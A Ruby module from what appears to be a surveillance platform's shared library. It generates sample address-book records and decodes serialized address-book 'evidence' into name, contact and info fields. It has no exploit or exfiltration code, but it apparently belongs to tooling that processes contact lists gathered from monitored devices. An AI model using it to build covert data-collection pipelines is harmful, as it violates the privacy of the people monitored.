require 'rcs-common/evidence/common'
require 'rcs-common/serializer'

module RCS
module AddressbookEvidence
  def content
    fields = { :first_name => ["John", "Liza", "Bruno"].sample, :last_name => ["Doe", "Rossi", "Bianchi"].sample, :company => ["Acme Inc.", "Disney", "Apple Inc."].sample, :mobile_phone_number => ["00155597865", "0012342355", "+3901234567"].sample}
    AddressBookSerializer.new.serialize fields
  end
  
  def generate_content
    [ content ]
  end
  
  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    info = Hash[common_info]
    info[:data] = Hash.new if info[:data].nil?

    @address_book = AddressBookSerializer.new.unserialize stream
    
    info[:data][:name] = @address_book.name
    info[:data][:contact] = @address_book.contact
    info[:data][:info] = @address_book.info
    
    yield info if block_given?
    :delete_raw
  end
end # ::AddressbookEvidence
end # ::RCS
